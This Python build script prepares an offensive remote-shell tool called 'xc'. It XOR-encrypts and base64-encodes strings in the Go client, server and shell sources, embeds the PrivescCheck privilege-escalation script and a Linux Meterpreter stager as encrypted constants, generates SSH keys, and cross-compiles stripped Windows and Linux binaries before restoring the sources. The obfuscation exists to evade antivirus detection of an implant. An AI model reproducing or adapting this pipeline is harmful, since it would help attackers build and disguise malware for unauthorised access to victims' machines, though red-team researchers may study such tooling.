#!/usr/bin/env python3

import os
import base64
import warnings
import os
import random
import re
import string
import binascii
warnings.filterwarnings("ignore", category=DeprecationWarning) 

key = os.urandom(32)
def bake(data):
    temp  = []
    for i in range(0, len(data)): 
        temp.append(data[i] ^ key[i % len(key)]) 
    encrypted = bytes(temp)     
    encoded = base64.b64encode(encrypted)
    return encoded

if __name__ == "__main__":

    # set random version string
    os.system("cp xc.go /tmp/xc.go.bak")
    with open("xc.go") as f:
        gosrc = f.read()
        # static replacements
        gosrc = gosrc.replace('§version§',''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10)))        
        # dynamic replacements
        pattern = r"§(.*)§"
        matches = re.finditer(pattern, gosrc, re.MULTILINE)
        for matchNum, match in enumerate(matches, start=1):
            placeholder = match.group()
            gosrc = gosrc.replace(placeholder,bake(bytes(placeholder.replace('§',''), encoding='utf8')).decode())            
    with open("xc.go", "w") as f:
        f.write(gosrc)

    os.system("cp utils/utils.go /tmp/utils.go.bak")
    with open("utils/utils.go") as f:
        gosrc = f.read()
        gosrc = gosrc.replace('§key§',binascii.hexlify(key).decode())            
    with open("utils/utils.go", "w") as f:
        f.write(gosrc)    
    
    # embed privesccheck & obfuscate strings
    os.system("cp client/client_windows.go /tmp/client_windows.go.bak")
    with open("client/client_windows.go", "r+") as f:
        with open("files/powershell/privesccheck/PrivescCheck.ps1", "rb") as sf:
            gosrc = f.read()
            scriptsrc = sf.read()
            encoded = base64.b64encode(scriptsrc)
            # static replacements
            gosrc = gosrc.replace('§privesccheck§',bake(encoded).decode())     
            # dynamic replacements
            pattern = r"§(.*)§"
            matches = re.finditer(pattern, gosrc, re.MULTILINE)
            for matchNum, match in enumerate(matches, start=1):
                placeholder = match.group()
                gosrc = gosrc.replace(placeholder,bake(bytes(placeholder.replace('§',''), encoding='utf8')).decode())                     
    with open("client/client_windows.go", "w") as f:
        f.write(gosrc)    

    
    # obfuscate shell_windows
    os.system("cp shell/shell_windows.go /tmp/shell_windows.go.bak")
    with open("shell/shell_windows.go", "r+") as f:        
        gosrc = f.read()            
        # dynamic replacements
        pattern = r"§(.*)§"
        matches = re.finditer(pattern, gosrc, re.MULTILINE)
        for matchNum, match in enumerate(matches, start=1):
            placeholder = match.group()
            gosrc = gosrc.replace(placeholder,bake(bytes(placeholder.replace('§',''), encoding='utf8')).decode())                     
    with open("shell/shell_windows.go", "w") as f:
        f.write(gosrc)    

    
    # obfuscate server
    os.system("cp server/server.go /tmp/server.go.bak")
    with open("server/server.go", "r+") as f:        
        gosrc = f.read()            
        # dynamic replacements
        pattern = r"§(.*)§"
        matches = re.finditer(pattern, gosrc, re.MULTILINE)
        for matchNum, match in enumerate(matches, start=1):
            placeholder = match.group()
            gosrc = gosrc.replace(placeholder,bake(bytes(placeholder.replace('§',''), encoding='utf8')).decode())                     
    with open("server/server.go", "w") as f:
        f.write(gosrc)    
    

    # embed keys
    with open("shell/keys.go", "w+") as f:
        f.write("package shell \n\n// autogenerated - do not modify\n\nconst (\n")
        for entry in os.scandir("files/keys"):
            f.write(entry.name.replace(".","_") + " = `")
            with open(entry.path, "r") as keyfile:
                content = keyfile.read()               
                f.write(content)
                f.write("`\n")
        f.write(")\n")

    # embed linux meterpreter stager
    with open("meter/sc.go", "w+") as f:
        f.write("package meter \n\n// autogenerated - do not modify\n\nconst (\n")
        for entry in os.scandir("files/sc"):
            f.write(entry.name + " = \"")
            with open(entry.path, "rb") as scfile:
                content = scfile.read()
                enc = bake(content).decode()
                f.write(enc)
                f.write("\"\n")
        f.write(")\n")

    # clean & prep
    print("[+] Preparing Build...")
    os.system("rm files/keys/host* 2>/dev/null")
    os.system("rm files/keys/key*  2>/dev/null")
    os.system("mkdir -p files/keys 2>/dev/null")
    os.system("yes 'y' 2>/dev/null | ssh-keygen -t ed25519 -f files/keys/key -q -N \"\"")
    os.system("yes 'y' 2>/dev/null | ssh-keygen -f host_dsa -N '' -t dsa -f files/keys/host_dsa -q -N \"\"")
    os.system("yes 'y' 2>/dev/null | ssh-keygen -f host_rsa -N '' -t rsa -f files/keys/host_rsa -q -N \"\"")    
    
    # build
    print("[+] Building...")
    os.system("rm xc.exe xc 2>/dev/null")
    os.system('GOOS=windows GOARCH=amd64 GO111MODULE=off go build -ldflags="-s -w" -buildmode=pie -trimpath -o xc.exe xc.go')   
    os.system('GOOS=linux GOARCH=amd64 GO111MODULE=off go build -ldflags="-s -w" -buildmode=pie -trimpath -o xc xc.go')
    #os.system("upx --ultra-brute xc.exe -o xcc.exe; rm xc.exe && mv xcc.exe xc.exe")   
    #os.system("upx --ultra-brute xc.exe xc -o xcc; rm xc && mv xcc xc")   

    # clean up
    print("[+] Cleaning up...")    
    os.system("cp /tmp/xc.go.bak xc.go && rm /tmp/xc.go.bak")    
    os.system("cp /tmp/utils.go.bak utils/utils.go && rm /tmp/utils.go.bak") 
    os.system("cp /tmp/client_windows.go.bak client/client_windows.go && rm /tmp/client_windows.go.bak")   
    os.system("cp /tmp/shell_windows.go.bak shell/shell_windows.go && rm /tmp/shell_windows.go.bak")    
    os.system("cp /tmp/server.go.bak server/server.go && rm /tmp/server.go.bak")  
    os.system("rm shell/keys.go meter/sc.go 2>/dev/null")
    print("[+] Done")  

    # obfuscate
